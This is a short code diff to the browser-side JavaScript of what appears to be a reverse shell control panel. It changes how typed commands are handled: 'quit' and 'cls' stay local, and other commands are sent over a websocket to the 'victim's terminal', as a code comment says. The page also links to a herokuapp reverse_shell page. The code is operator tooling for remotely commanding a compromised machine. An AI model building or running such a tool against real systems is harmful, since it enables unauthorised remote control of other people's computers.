@@ -121,11 +121,9 @@
     }
 
     function prompt(term) {
-      term.write('\r\n$ ');
-      // Send command to victim's terminal via websocket.
-      webSocket.send(JSON.stringify({
-            'message': command
-        }));
+      if (command !== '') {
+        command_history.push(command);
+      }
       if (command === 'quit') {
         webSocket.close();
         window.location.assign('https://intense-river-70224.herokuapp.com/reverse_shell/');
@@ -133,8 +131,12 @@
       else if (command === 'cls') {
         term.clear();
       }
-      if (command !== '') {
-        command_history.push(command);
+      else {
+        term.write('\r\n$ ');
+        // Send command to victim's terminal via websocket.
+        webSocket.send(JSON.stringify({
+              'message': command
+          }));
       }
       index = command_history.length;
       command = '';
